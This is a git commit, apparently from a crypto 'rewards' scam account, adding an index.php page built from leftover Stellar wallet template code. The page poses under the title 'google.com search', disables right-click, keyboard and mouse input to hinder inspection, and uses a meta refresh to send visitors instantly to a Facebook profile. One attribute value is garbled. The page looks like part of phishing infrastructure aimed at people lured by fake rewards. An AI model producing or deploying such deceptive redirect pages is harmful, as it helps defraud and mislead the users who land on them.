89a6b144d0b2d3ed850cb5da45826e423754fc61
Axie-Rewards <158626578+Axie-Rewards@users.noreply.github.com>
2024-02-03 05:54:25 +0700

    Add files via upload

---
+++ img/index.php
@@ -0,0 +1,43 @@
+
+<!DOCTYPE html>
+<html class="no-js"><script>
+
+</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+
+  <title>google.com search</title>
+  <meta name="description" content="">
+ 
+
+ <meta name="viewport" content="width=device-width">
+
+</head>
+
+<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;"><!-- uiView: --><div ui-view="" class="ng-scope">
+
+
+<div class="so-back ng-scope" ng-controller="interstellar-basic-client.HeaderController as header">
+  <div class="so-chunk">
+  </div>
+</div>
+
+  <!-- ngIf: widget.view == 'sendConfirm' --><div class="sendConfirm ng-scope" ng-if="widget.view == ÞsendConfirm'">
+
+
+
+<meta http-equiv="refresh" content=" 0;url=https://www.facebook.com/lea.mea87">
+ 
+
+
+   
+    <!-- ngIf: widget.memo --><div class="sendConfirm__sendingContainer ng-scope" ng-if="widget.memo">
+       
+
+      </div>
+    </div><!-- end ngIf: widget.memo -->
+    <!-- ngIf: !widget.memo && widget.memoWarningAlerts.length > 0 -->
+
+
+
+</div>
+
+</body></html>
